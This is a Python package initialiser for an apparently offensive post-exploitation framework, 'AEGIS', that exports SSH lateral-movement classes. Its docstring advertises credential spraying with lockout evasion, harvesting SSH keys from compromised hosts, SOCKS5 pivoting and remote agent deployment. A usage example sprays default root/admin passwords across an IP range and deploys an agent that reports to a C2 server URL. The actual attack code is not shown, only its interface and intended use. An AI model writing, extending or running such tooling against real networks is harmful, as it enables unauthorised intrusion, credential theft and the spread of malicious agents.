import os
"""
AEGIS-Advanced Node Lateral Movement Package
==============================================
SSH-based lateral movement: credential spraying, key harvesting,
port forwarding, SOCKS5 proxies, pivot extraction, and remote
agent deployment across discovered hosts.

Exports:
    SSHSession          — Full SSH session with exec/upload/download/tunnel
    SSHCredSpray        — Multi-host credential spray with lockout awareness
    SSHKeyHarvest       — Harvest keys from known paths on compromised host
    SSHPivot            — Network discovery + hop management
    SSHMover            — High-level orchestrator combining all functionality

Usage:
    from node.lateral import SSHSession, SSHMover

    # Single session
    sess = SSHSession("10.0.0.5", 22, username="root", password=os.environ.get("LATERAL_SSH_PASS", ""))
    if sess.connect():
        output = sess.exec("id")
        sess.upload("/local/file", "/remote/path")
        sess.socks5_proxy(local_port=1080)

    # Full mover (spray + move + deploy)
    from node.lateral import SSHMover
    mover = SSHMover(c2_url="https://c2.yourdomain.com:5000")
    mover.spray_and_move(
        hosts=["10.0.0.1-10.0.0.50"],
        credentials=[("root", "password"), ("admin", "admin123")],
        deploy_agent=True,
    )
"""

from .ssh_mover import (
    SSHSession,
    SSHCredSpray,
    SSHKeyHarvest,
    SSHPivot,
    SSHMover,
)

__all__ = [
    "SSHSession",
    "SSHCredSpray",
    "SSHKeyHarvest",
    "SSHPivot",
    "SSHMover",
]

__version__ = "5.0"
